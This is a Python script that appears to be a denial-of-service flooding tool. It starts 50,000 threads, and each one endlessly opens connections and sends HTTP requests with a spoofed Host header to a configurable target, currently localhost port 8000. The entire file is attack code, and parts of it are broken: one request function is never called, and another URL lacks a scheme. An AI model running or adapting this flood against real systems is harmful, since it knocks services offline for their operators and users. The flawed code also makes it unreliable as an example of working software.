import requests
import socket
import threading

target = ('127.0.0.1')
dummy_ip = (' 123.43.32.11')
port = int(8000 )
port = int(port)

attack_num = 0
print("Sending requests Packets!!...")

def attack_request():
    global attack_num
    while True:
        try:
            response = requests.get(target)
            if response.status_code == 200:
                attack_num += 1
                print(f"Request #{attack_num} was successful!")
                print("Response content:")
                print(response.text)
            else:
                print(f"Request #{attack_num} was not successful. Status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

def attack_socket():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + dummy_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        attack_num += 1
        packet_num = str(attack_num)
        print("Packets Sending => " + packet_num)
        print("Done")

        s.close()
if __name__ == "__main__":
    for i in range(50000):
        thread = threading.Thread(target=attack_socket)
        thread.start()


    
    
